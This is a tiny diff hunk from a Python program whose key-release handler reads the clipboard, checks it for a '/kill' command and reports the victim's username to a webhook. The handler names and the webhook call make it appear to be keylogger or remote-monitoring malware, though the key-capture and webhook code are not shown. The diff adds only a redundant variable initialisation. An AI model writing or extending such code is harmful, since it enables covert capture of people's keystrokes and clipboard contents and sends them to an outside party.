@@ -91,6 +91,7 @@ def on_press(key):
 
 
 def on_release(key):
+    current_clipboard = ""
     current_clipboard = pyperclip.paste()
     if "/kill" in current_clipboard:
         send_to_webhook(f"Connection stopped by user: {username}")
